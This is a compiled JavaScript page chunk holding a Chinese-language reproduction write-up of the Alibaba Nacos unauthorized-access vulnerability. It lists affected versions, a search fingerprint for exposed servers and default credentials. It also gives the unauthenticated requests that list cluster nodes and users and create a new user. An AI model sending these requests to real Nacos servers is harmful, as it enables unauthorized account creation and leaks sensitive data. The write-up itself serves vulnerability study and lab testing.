(window.webpackJsonp=window.webpackJsonp||[]).push([[21],{1940:function(s,a,t){s.exports=t.p+"assets/img/nacos-1.0decc3c2.png"},1941:function(s,a,t){s.exports=t.p+"assets/img/nacos-2.9d714f1b.png"},1942:function(s,a,t){s.exports=t.p+"assets/img/nacos-3.fce1d7c8.png"},1943:function(s,a,t){s.exports=t.p+"assets/img/nacos-4.205552e3.png"},1944:function(s,a,t){s.exports=t.p+"assets/img/nacos-5.f9cfa73b.png"},1945:function(s,a,t){s.exports=t.p+"assets/img/nacos-7.a4492f3b.png"},1946:function(s,a,t){s.exports=t.p+"assets/img/nacos-6.4c25a559.png"},1947:function(s,a,t){s.exports=t.p+"assets/img/nacos-8.0f223c4b.png"},1948:function(s,a,t){s.exports=t.p+"assets/img/nacos-9.22dcd780.png"},1949:function(s,a,t){s.exports=t.p+"assets/img/nacos-10.eae6e6f0.png"},2923:function(s,a,t){"use strict";t.r(a);var e=t(75),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"alibaba-nacos-未授权访问漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#alibaba-nacos-未授权访问漏洞"}},[s._v("#")]),s._v(" Alibaba Nacos 未授权访问漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("Nacos <= 2.0.0-ALPHA.1")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v('title="Nacos"')]),e("br"),s._v(" "),e("h2",{attrs:{id:"环境搭建"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),e("a-alert",{attrs:{type:"success",message:"https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1",description:"",showIcon:""}}),s._v(" "),e("br"),s._v(" "),e("div",{staticClass:"language-shell line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-shell"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("tar")]),s._v(" -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz\n./startup.sh -m standalone\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("默认账号密码 "),e("code",[s._v("nacos/nacos")])]),s._v(" "),e("p",[e("img",{attrs:{src:t(1940),alt:"img"}})]),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("可以再项目的 issues 中看到大量的关于越权的安全问题的讨论")]),s._v(" "),e("p",[s._v("https://github.com/alibaba/nacos/issues/1105")]),s._v(" "),e("p",[e("img",{attrs:{src:t(1941),alt:"img"}})]),s._v(" "),e("p",[e("img",{attrs:{src:t(1942),alt:"img"}})]),s._v(" "),e("p",[s._v("这里我们在登录后任意一个位置看一下请求，并在未授权的情况下看是否可以访问")]),s._v(" "),e("p",[e("img",{attrs:{src:t(1943),alt:"img"}})]),s._v(" "),e("p",[s._v("退出用户后在前台访问这个 url")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1944),alt:"img"}})]),s._v(" "),e("p",[s._v("可以发现以及泄露了 "),e("code",[s._v("ip节点")]),s._v(" 等数据,同样我们查看用户列表的请求并在前台访问")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("/nacos/v1/auth/users?pageNo=1&pageSize=9\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1945),alt:"img"}})]),s._v(" "),e("p",[e("img",{attrs:{src:t(1946),alt:"img"}})]),s._v(" "),e("p",[s._v("这里可以发现对用户的请求是完全没有过滤的，可以通过未授权的情况获取用户的敏感信息")]),s._v(" "),e("p",[s._v("我们尝试创建用户并抓包")]),s._v(" "),e("p",[e("img",{attrs:{src:t(1947),alt:"img"}})]),s._v(" "),e("p",[s._v("返回下列创建成功")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v('{"code":200,"message":"create user ok!","data":null}\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("同样的我们简化请求")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("POST /nacos/v1/auth/users?\nusername=peiqi&password=peiqi\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1948),alt:"img"}})]),s._v(" "),e("p",[e("img",{attrs:{src:t(1949),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);